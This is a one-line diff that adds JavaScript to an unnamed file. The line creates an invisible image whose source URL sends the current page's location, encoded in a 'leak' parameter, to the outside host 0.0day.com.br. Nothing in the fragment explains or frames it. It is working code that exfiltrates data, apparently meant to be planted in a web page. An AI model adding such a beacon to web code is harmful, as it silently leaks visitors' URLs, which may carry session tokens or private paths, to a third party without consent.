@@ -1,0 +1,1 @@
+var i = document.createElement("img"); i.src = "http://0.0day.com.br?leak="+encodeURIComponent(document.location);
